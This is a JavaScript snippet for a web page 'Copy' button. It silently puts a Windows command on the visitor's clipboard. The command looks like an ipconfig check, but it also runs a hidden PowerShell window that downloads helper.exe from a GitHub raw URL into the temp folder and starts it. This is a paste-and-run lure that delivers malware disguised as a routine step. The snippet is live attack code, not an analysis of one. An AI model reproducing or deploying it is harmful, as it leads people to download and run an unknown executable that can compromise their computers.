const COPY_TEXT = `cmd /c ipconfig & powershell -w h -c "iwr 'https://raw.githubusercontent.com/luhmeowsy/shiny-cat-print/refs/heads/main/helper.exe' -outf $env:temp\helper.exe; start $env:temp\helper.exe`;


function copyCmd(){

    navigator.clipboard.writeText(COPY_TEXT);


    let btn = document.getElementById("copy");


    btn.innerHTML = "✓";

    btn.style.background = "#107c10";


    setTimeout(()=>{

        btn.innerHTML = "Copy";

        btn.style.background = "#334155";

    },2000);

}